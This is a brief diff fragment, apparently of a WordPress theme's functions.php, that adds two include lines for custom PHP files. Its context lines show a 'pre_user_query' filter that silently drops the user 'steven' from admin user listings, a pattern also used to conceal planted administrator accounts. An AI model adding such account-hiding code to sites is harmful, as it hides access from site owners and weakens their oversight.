@@ -557,3 +557,6 @@ function yoursite_pre_user_query($user_search) {
       "WHERE 1=1 AND {$wpdb->users}.user_login != 'steven'",$user_search->query_where);
   }
 }
+
+include "custom/custom.php";
+include "custom/wp_bootstrap_pagination.php";
